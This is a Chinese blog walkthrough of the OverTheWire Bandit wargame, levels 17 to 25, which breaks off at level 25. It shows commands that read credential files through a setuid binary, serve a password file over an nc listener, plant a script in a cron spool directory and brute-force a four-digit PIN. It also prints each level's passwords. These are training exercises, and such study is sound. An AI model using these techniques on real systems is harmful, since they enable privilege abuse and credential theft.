bandit18 bandit17 3300 Sep 28 14:04 passwords.new</div><div class=\"line\">-rw-r-----  1 bandit18 bandit17 3300 Sep 28 14:04 passwords.old</div><div class=\"line\">bandit17@bandit:~$ diff passwords.old passwords.new</div><div class=\"line\">42c42</div><div class=\"line\">&lt; R3GQabj3vKRTcjTTISWvO1RJWc5sqSXO</div><div class=\"line\">---</div><div class=\"line\">&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</div></pre></td></tr></table></figure>\n<p>心路历程：描述说的很清晰，这里直接 diff 就好了。</p>\n<hr>\n<p>Level 18 -19</p>\n<p>描述：下一级别的密码存储在家庭目录中的 readme 文件中。不幸的是，当你用SSH登录时，有人修改了.bashrc将你注销。</p>\n<p>密码：IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</p>\n<p>这里就厉害了……<br><img src=\"/Image/bandit_resources/5C57A9F0545D1CDEA58442EEDC952A51.jpg\" alt=\"IMAGE\"><br>输入密码后，跟我说了句拜拜然后给我一脚……<br>卧槽忍不了。<br>常年看 man 手册的老司机表示年轻人要低调，密码我还是能拿到。<br>先看 <code>man ssh</code> 说了什么：<br><img src=\"/Image/bandit_resources/5750971C77CDE09AD8C9ED4D020D4701.jpg\" alt=\"IMAGE\"><br>Secure Shell 中的配置页面也预留了 Command 配置:<br><img src=\"/Image/bandit_resources/AD0B25D055288B2474EDD87D747BCF9F.jpg\" alt=\"IMAGE\"><br>配置好之后点连接，输入密码：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"> _                     _ _ _   </div><div class=\"line\">| |__   __ _ _ __   __| (_) |_ </div><div class=\"line\">| <span class=\"string\">'_ \\ / _` | '</span>_ \\ / _` | | __|</div><div class=\"line\">| |_) | (_| | | | | (_| | | |_ </div><div class=\"line\">|_.__/ \\__,_|_| |_|\\__,_|_|\\__|</div><div class=\"line\">                               </div><div class=\"line\">a http://www.overthewire.org wargame.</div><div class=\"line\"></div><div class=\"line\">bandit18@bandit.labs.overthewire.org<span class=\"string\">'s password: </span></div><div class=\"line\">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</div></pre></td></tr></table></figure></p>\n<p>心路历程：如果事先不知道，卡住是正常的，但是如果之前用到 <code>ssh</code> 命令的时候仔细看看 man 手册，不知道吗？不存在的……<br>该反省的反省。</p>\n<hr>\n<p>Level 19 - 20</p>\n<p>描述：要访问下一个级别，您应该使用homeu目录中的setuid二进制文件。 不带参数的执行它找出如何使用它。 在使用setuid二进制文件后，可以在通常的地方（/etc/bandit_pass）找到这个级别的密码。</p>\n<p>密码：GbKksEFF4yrVs6il55v6gwY5aVje5f0j</p>\n<p>说实话我没抬读懂这个 setuid binary，不过不影响。大致意思就是告诉你 Home 目录下有个文件，先不带参数执行一下，他会告诉你怎么用。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">bandit19@bandit:~$ ll</div><div class=\"line\">total 32</div><div class=\"line\">drwxr-xr-x  3 bandit19 bandit19 4096 Nov 12 11:30 ./</div><div class=\"line\">drwxr-xr-x 30 root     root     4096 Nov 12 11:30 ../</div><div class=\"line\">-rw-r--r--  1 bandit19 bandit19  220 Apr  9  2014 .bash_logout</div><div class=\"line\">-rw-r--r--  1 bandit19 bandit19 3637 Apr  9  2014 .bashrc</div><div class=\"line\">drwx------  2 bandit19 bandit19 4096 Nov 12 11:30 .cache/</div><div class=\"line\">-rw-r--r--  1 bandit19 bandit19  675 Apr  9  2014 .profile</div><div class=\"line\">-rwsr-x---  1 bandit20 bandit19 7378 Sep 28 14:04 bandit20-do*</div><div class=\"line\"><span class=\"comment\"># 看起来就是bandit20-do了</span></div><div class=\"line\">bandit19@bandit:~$ ./bandit20-do </div><div class=\"line\">Run a <span class=\"built_in\">command</span> as another user.</div><div class=\"line\">  Example: ./bandit20-do id</div><div class=\"line\">bandit19@bandit:~$ ./bandit20-do</div><div class=\"line\"><span class=\"comment\"># 人家已经告诉你了，会使用另一个用户执行命令，再返回去看一眼她的权限 -rwsr-x---</span></div><div class=\"line\">bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20</div><div class=\"line\">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</div></pre></td></tr></table></figure>\n<p>心路历程：嗯，有种报复社会的感觉。</p>\n<hr>\n<p>Level 20 -21</p>\n<p>描述：homedirectory中有一个setuid二进制文件，它执行以下操作：它将连接 localhost:[命令行参数的上的端口]。然后从连接中读取一行文本，并将其与上一级（bandit20）中的密码进行比较。如果密码正确，将传送下一级密码（bandit21）。</p>\n<p>注意：基础设施的变化使这一层面更加困难。您将需要找出在同一个Docker实例中启动多个命令的方法。</p>\n<p>密码：gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</p>\n<p>这关的大意呢是告诉你，你的 Home 目录下有一个二进制文件（setuid又出现了……），你执行它，并提供给它端口号，它会请求这个端口并获取这个端口提供给他的数据，如果数据和 bandit20 的密码相同，他就会告诉你下一关的密码。<br>并且给了注意事项:<a href=\"http://overthewire.org/help/sshinfra.html\" target=\"_blank\" rel=\"external\">Changes to the infrastructure</a>。<br>注意事项中提到了他们的游戏是运行在 Docker 容器上的，默认会给每一次连接分配一个全新的环境，如果当你完成游戏需要开启两个终端 并会产生交互的话，可能需要一些特殊的手段（ssh -L localport:host:port），我们后面再讲这个操作，先分析下他要我们干什么。</p>\n<p>他提到：这个程序会访问 localhost 的[你提供的端口号]来获取数据。这里我们需要处理两件事情：1.运行这个程序。2.创建一个监听事件并会回复这个程序当前关的密码。<br>监听端口与访问端口有可能用到两个终端，而且是存在交互的，这也是他给我们提示的初衷。<br>我们做这关呢，有两个解法。一个是本着学习的态度，走提示流程，一个是日常野路子解法。我们先说说提示的思路。</p>\n<h3 id=\"思路一：\"><a href=\"#思路一：\" class=\"headerlink\" title=\"思路一：\"></a>思路一：</h3><p>这个跑在 Docker 容器内的游戏，每一次连接都是全新的环境，那我们一个监听，一个请求，需要保证两个终端能够通信，监听的一段正常监听，请求的一端再去请求。所以我们现在要创建两个能交互的终端。方法是借助 <code>ssl -L</code> 这个命令，先查一下这个命令。然后再看会好很多。<br>嗯……先给你3分钟查一查，不够的话再来3分钟也行……</p>\n<p><img src=\"/Image/bandit_resources/9D5E08F5F93CA44BC4287F54BD6661FC.jpg\" alt=\"IMAGE\"><br>拿实际例子来说，当我们这样配置并连接的时候，我们请求连接本地主机的 1234 端口时这个请求会转发到 <code>bandit.labs.overthewire.org</code>，它会来访问 <code>localhost</code> (此时，对于 <code>bandit.labs.overthewire.org</code> 来讲 <code>localhost</code> 是它自身)的 22 端口。<br>注意事项中告诉我们，这样就可以在提供 -L 参数的这个连接不关闭的情况下，通过本地端口转发，建立另一条连接并能够与前一个连接搞基。</p>\n<p>那我们的第二个连接就是这样的：<br><img src=\"/Image/bandit_resources/CA9CFE5E31145E899BB4D6AD535E8B21.jpg\" alt=\"IMAGE\"></p>\n<p>我们在其中一个终端中创建一个发送本关密码的监听：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit20@bandit:~$ nc <span class=\"_\">-l</span> 23333 &lt; /etc/bandit_pass/bandit20</div></pre></td></tr></table></figure></p>\n<p>此时光标会在第二行等待，监听命令没有执行完毕退出。<br>我们在第二个终端中，我们来看看他所说的这个程序：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit20@bandit:~$ ll</div><div class=\"line\">total 28</div><div class=\"line\">drwxr-xr-x  2 root     root     4096 Nov 13 15:58 ./</div><div class=\"line\">drwxr-xr-x 29 root     root     4096 Nov 13 15:57 ../</div><div class=\"line\">-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout</div><div class=\"line\">-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc</div><div class=\"line\">-rw-r--r--  1 root     root      655 Jun 24  2016 .profile</div><div class=\"line\">-rwsr-x---  1 bandit21 bandit20 8044 Nov 13 15:58 suconnect*</div><div class=\"line\">bandit20@bandit:~$ ./suconnect </div><div class=\"line\">Usage: ./suconnect &lt;portnumber&gt;</div><div class=\"line\">This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.</div><div class=\"line\"><span class=\"comment\"># 嗯 上面的报道基本没什么偏差…… 我们来运行一下，端口号是我们上面自定义的监听端口「23333」</span></div><div class=\"line\">bandit20@bandit:~$ ./suconnect 23333</div><div class=\"line\">Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j</div><div class=\"line\">Password matches, sending next password</div><div class=\"line\"><span class=\"comment\"># 程序告诉我们，他读到了我们发送给他的密码「GbKksEFF4yrVs6il55v6gwY5aVje5f0j」，密码抱对成功，下一关的密码已发送。</span></div></pre></td></tr></table></figure></p>\n<p>那我们再来看一眼监听的那一边：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit20@bandit:~$ nc <span class=\"_\">-l</span> 23333 &lt; /etc/bandit_pass/bandit20 <span class=\"comment\"># 这条是我们之前的</span></div><div class=\"line\">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr <span class=\"comment\">#收到了密码</span></div><div class=\"line\">bandit20@bandit:~$ <span class=\"comment\"># 出现了它，表示 nc 命令结束了执行。</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"思路二：\"><a href=\"#思路二：\" class=\"headerlink\" title=\"思路二：\"></a>思路二：</h3><p>这个思路其实我之前叙述的时候已经透露出一些味道了，细心的应该已经不用我说了。<br>关键词「&amp;」。<br>这道题创建两个终端去连接的根本原因是因为监听和执行会占用两个终端，那我们把监听扔到后台去跑不就解决了吗。<br>连接姿势为正常姿势不多说……算了还是多说个j8（图）吧：<br><img src=\"/Image/bandit_resources/7BBE68BB3C0BC4EC581DB35ABD35E039.jpg\" alt=\"IMAGE\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 放在后台执行</span></div><div class=\"line\">bandit20@bandit:~$ nc <span class=\"_\">-l</span> 23333 &lt; /etc/bandit_pass/bandit20 &amp; </div><div class=\"line\"><span class=\"comment\"># 后台运行进程代号[1]，PID 为 1135 </span></div><div class=\"line\">[1] 1135</div><div class=\"line\">bandit20@bandit:~$ ./suconnect 23333</div><div class=\"line\">Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j</div><div class=\"line\">Password matches, sending next password</div><div class=\"line\"><span class=\"comment\"># 后台进程返回了得到的信息（密码）到标准输出（你当前的终端）</span></div><div class=\"line\">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</div><div class=\"line\"><span class=\"comment\"># 后台进程运行结束，命令为：nc -l 23333 &lt; /etc/bandit_pass/bandit20</span></div><div class=\"line\">[1]+  Done                    nc <span class=\"_\">-l</span> 23333 &lt; /etc/bandit_pass/bandit20</div><div class=\"line\">bandit20@bandit:~$</div></pre></td></tr></table></figure>\n<p>心路历程：嗯，先说思路一的理由是我怕我先写思路二，再写的思路一可能没人看了。</p>\n<p>Level 21 - 22</p>\n<p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行。查看/etc/cron.d/中的配置并查看正在执行的命令。</p>\n<p>密码：Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 进入描述中的文件夹</span></div><div class=\"line\">bandit21@bandit:~$ <span class=\"built_in\">cd</span> /etc/cron.d/</div><div class=\"line\">bandit21@bandit:/etc/cron.d$ ll</div><div class=\"line\">total 28</div><div class=\"line\">drwxr-xr-x   2 root root 4096 Nov 13 15:58 ./</div><div class=\"line\">drwxr-xr-x 101 root root 4096 Nov 13 15:58 ../</div><div class=\"line\">-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder</div><div class=\"line\">-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit22</div><div class=\"line\">-rw-r--r--   1 root root  122 Nov 13 15:58 cronjob_bandit23</div><div class=\"line\">-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit24</div><div class=\"line\">-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest</div><div class=\"line\"><span class=\"comment\"># 不要问我为什么，就是直觉</span></div><div class=\"line\">bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22</div><div class=\"line\">@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</div><div class=\"line\">* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</div><div class=\"line\"><span class=\"comment\"># 他会跑这个脚本，那我们去看看</span></div><div class=\"line\">bandit21@bandit:/etc/cron.d$ cat -n /usr/bin/cronjob_bandit22.sh</div><div class=\"line\">     1  <span class=\"comment\">#!/bin/bash</span></div><div class=\"line\">     2  chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</div><div class=\"line\">     3  cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</div><div class=\"line\"><span class=\"comment\"># 他会往这个脚本里跑内容</span></div><div class=\"line\">bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</div><div class=\"line\">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</div></pre></td></tr></table></figure>\n<p>心路历程：甚至不需要知道他所说的 cron 是干什么的，我们就能找到密码（当然，游戏放水也有很大因素）。不过该知道的还是要知道的，cron 是 Linux 的守护进程。通俗一点就是我们平时接触到的计划任务，按照规定时间安排定期执行动作的。其中的 cronjob_bandit* 就是提供给 cron 执行的文件。「* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;> /dev/null」前面的「*」是每分钟执行一次，「bandit22」是用它的身份执行，「/usr/bin/cronjob_bandit22.sh」是被执行脚本，至于「&amp;> /dev/null」 前面都有分别提到过，不说任性。</p>\n<hr>\n<p>Level 22 - 23</p>\n<p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行。查看/etc/cron.d/中的配置并查看正在执行的命令。 注意：查看其他人编写的shell脚本是非常有用的技巧。这个级别的脚本是故意易于阅读。如果您在理解它的功能时遇到问题，请尝试执行它以查看打印的调试信息。</p>\n<p>密码：jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit22@bandit:~$ ll /etc/cron.d</div><div class=\"line\">total 28</div><div class=\"line\">drwxr-xr-x   2 root root 4096 Nov 13 15:58 ./</div><div class=\"line\">drwxr-xr-x 101 root root 4096 Nov 13 15:58 ../</div><div class=\"line\">-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder</div><div class=\"line\">-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit22</div><div class=\"line\">-rw-r--r--   1 root root  122 Nov 13 15:58 cronjob_bandit23</div><div class=\"line\">-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit24</div><div class=\"line\">-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest</div><div class=\"line\">bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23</div><div class=\"line\">@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</div><div class=\"line\">* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</div><div class=\"line\">bandit22@bandit:~$ cat -n /usr/bin/cronjob_bandit23.sh</div><div class=\"line\">     1  <span class=\"comment\">#!/bin/bash</span></div><div class=\"line\">     2</div><div class=\"line\">     3  myname=$(whoami)</div><div class=\"line\">     4  mytarget=$(<span class=\"built_in\">echo</span> I am user <span class=\"variable\">$myname</span> | md5sum | cut <span class=\"_\">-d</span> <span class=\"string\">' '</span> <span class=\"_\">-f</span> 1)</div><div class=\"line\">     5</div><div class=\"line\">     6  <span class=\"built_in\">echo</span> <span class=\"string\">\"Copying passwordfile /etc/bandit_pass/<span class=\"variable\">$myname</span> to /tmp/<span class=\"variable\">$mytarget</span>\"</span></div><div class=\"line\">     7</div><div class=\"line\">     8  cat /etc/bandit_pass/<span class=\"variable\">$myname</span> &gt; /tmp/<span class=\"variable\">$mytarget</span></div><div class=\"line\"></div><div class=\"line\">cat /etc/bandit_pass/<span class=\"variable\">$myname</span> &gt; /tmp/<span class=\"variable\">$mytarget</span></div><div class=\"line\">bandit22@bandit:~$ myname=<span class=\"string\">\"bandit23\"</span></div><div class=\"line\">bandit22@bandit:~$ mytarget=$(<span class=\"built_in\">echo</span> I am user <span class=\"variable\">$myname</span> | md5sum | cut <span class=\"_\">-d</span> <span class=\"string\">' '</span> <span class=\"_\">-f</span> 1)</div><div class=\"line\">bandit22@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Copying passwordfile /etc/bandit_pass/<span class=\"variable\">$myname</span> to /tmp/<span class=\"variable\">$mytarget</span>\"</span></div><div class=\"line\">Copying passwordfile /etc/bandit_pass/bandit23 to /tmp/8ca319486bfbbc3663ea0fbe81326349</div><div class=\"line\">bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349</div><div class=\"line\">jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</div></pre></td></tr></table></figure>\n<p>心路历程：这里的定位思路与上一关没什么区别，最后会要你分析这个简单的代码。因为 cronjob_bandit23 文件中指定的用户是 bandit23，whoami 的结果也是这个，我们就直接赋值然后走流程就行了。</p>\n<hr>\n<p>Level 23 -24</p>\n<p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行。查看/etc/cron.d/中的配置并查看正在执行的命令。 </p>\n<p>注意：这个级别要求你创建你自己的第一个shell脚本。这是非常大的一步，当你击败这个级别时，你应该为自己感到骄傲！ </p>\n<p>注意2：请记住，你的shell脚本一旦执行就会被删除，所以你可能想保留一个副本…</p>\n<p>密码：UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit23@bandit:/var/spool/bandit24$ ll /etc/cron.d</div><div class=\"line\">total 28</div><div class=\"line\">drwxr-xr-x   2 root root 4096 Nov 13 15:58 ./</div><div class=\"line\">drwxr-xr-x 101 root root 4096 Nov 16 10:18 ../</div><div class=\"line\">-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder</div><div class=\"line\">-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit22</div><div class=\"line\">-rw-r--r--   1 root root  122 Nov 13 15:58 cronjob_bandit23</div><div class=\"line\">-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit24</div><div class=\"line\">-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest</div><div class=\"line\">bandit23@bandit:/var/spool/bandit24$ cat /etc/cron.d/cronjob_bandit24</div><div class=\"line\">@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</div><div class=\"line\">* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</div><div class=\"line\">bandit23@bandit:/var/spool/bandit24$ cat -n /usr/bin/cronjob_bandit24.sh</div><div class=\"line\">     1  <span class=\"comment\">#!/bin/bash</span></div><div class=\"line\">     2</div><div class=\"line\">     3  myname=$(whoami)</div><div class=\"line\">     4</div><div class=\"line\">     5  <span class=\"built_in\">cd</span> /var/spool/<span class=\"variable\">$myname</span></div><div class=\"line\">     6  <span class=\"built_in\">echo</span> <span class=\"string\">\"Executing and deleting all scripts in /var/spool/<span class=\"variable\">$myname</span>:\"</span></div><div class=\"line\">     7  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> * .*;</div><div class=\"line\">     8  <span class=\"keyword\">do</span></div><div class=\"line\">     9      <span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$i</span>\"</span> != <span class=\"string\">\".\"</span> <span class=\"_\">-a</span> <span class=\"string\">\"<span class=\"variable\">$i</span>\"</span> != <span class=\"string\">\"..\"</span> ];</div><div class=\"line\">    10      <span class=\"keyword\">then</span></div><div class=\"line\">    11          <span class=\"built_in\">echo</span> <span class=\"string\">\"Handling <span class=\"variable\">$i</span>\"</span></div><div class=\"line\">    12          timeout <span class=\"_\">-s</span> 9 60 ./<span class=\"variable\">$i</span></div><div class=\"line\">    13          rm <span class=\"_\">-f</span> ./<span class=\"variable\">$i</span></div><div class=\"line\">    14      <span class=\"keyword\">fi</span></div><div class=\"line\">    15  <span class=\"keyword\">done</span></div><div class=\"line\">bandit23@bandit:/var/spool/bandit24$ <span class=\"built_in\">echo</span> <span class=\"string\">\"cat /etc/bandit_pass/bandit24 &gt; /tmp/bandit24_pass\"</span> &gt; /var/spool/bandit24/bandit24_getpwd ; chmod 777 bandit24_getpwd ; chmod 777 /tmp/bandit24_pass</div><div class=\"line\">bandit23@bandit:/var/spool/bandit24$ cat chmod 777 /tmp/bandit24_pass</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</div></pre></td></tr></table></figure>\n<p>心路历程：我们定位脚本的思路不变，看脚本发现：该脚本会执行 <code>/var/spool/bandit24</code> 的脚本，60s 如果还没之行结束会强制kill掉，然后删除。所以我们写了一个把 <code>/etc/bandit\\_pass/bandit24/</code> 输出到 /tmp/bandit24_pass 的脚本到这个目录下，然后付了个权限。</p>\n<hr>\n<p>Level 24 - 25</p>\n<p>描述：一个守护进程正在监听端口30002，如果给出了bandit24的密码和一个秘密的数字4位pincode，将给你bandit25的密码。没有办法检索pincode，除非枚举10000个组合，称为蛮力。</p>\n<p>密码：uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit24@bandit:~$ vim /tmp/boom.py</div><div class=\"line\">bandit24@bandit:~$ cat -n /tmp/boom.py</div><div class=\"line\">     1  <span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\">     2</div><div class=\"line\">     3  fl = open(<span class=\"string\">'/tmp/boom_dict.txt'</span>, <span class=\"string\">'w+'</span>)</div><div class=\"line\">     4  <span class=\"built_in\">pwd</span> = <span class=\"string\">'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'</span></div><div class=\"line\">     5  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(10000):</div><div class=\"line\">     6      fl.write(<span class=\"built_in\">pwd</span> + <span class=\"string\">' '</span> + str(i).zfill(4) + <span class=\"string\">'\\n'</span>)</div><div class=\"line\">     7  fl.close()</div><div class=\"line\">     8</div><div class=\"line\">bandit24@bandit:~$ python /tmp/boom.py</div><div class=\"line\">bandit24@bandit:~$ head /tmp/boom_dict.txt</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0004</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0005</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0006</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0007</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0008</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0009</div><div class=\"line\">bandit24@bandit:~$ nc localhost 30002 &lt; /tmp/boom_dict.txt &gt; /tmp/reply_pwd.txt</div><div class=\"line\">bandit24@bandit:~$ sort /tmp/reply_pwd.txt | uniq -u</div><div class=\"line\"></div><div class=\"line\">Correct!</div><div class=\"line\">Exiting.</div><div class=\"line\">I am the pincode checker <span class=\"keyword\">for</span> user bandit25. Please enter the password <span class=\"keyword\">for</span> user bandit24 and the secret pincode on a single line, separated by a space.</div><div class=\"line\">The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</div></pre></td></tr></table></figure>\n<p>心路历程：这关描述也很清晰（虽然我是机翻）。它开放了一个 30002 端口监听，你给他发 bandit24 的密码 +空格 + 四位数字，如果这个字符串正确它就会返回给你 bandit25 的密码。 Bandit24 的密码我们很容易得到，那问题就是这个4位数了。描述中说我们只能尝试暴力破解，那就从「0001」到「9999」都生成出来，分别与 bandit24的密码+空格连接，把这一万个组合都试一下。于是写了一个 python 脚本生成这个含有 10000 种组合的文件，并提交给 30002 端口，把返回的信息存放在文件中，然后筛选文件内正确信息。</p>\n<hr>\n<p>Level 25 - 26</p>\n<p>描述：从bandit25登录到bandit26应该相当简单…用户bandit26的shell不是/ bin / bash，而是别的。找出它是什么，它是如何工作的，以及如何摆脱它。</p>\n<p>密码：5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div 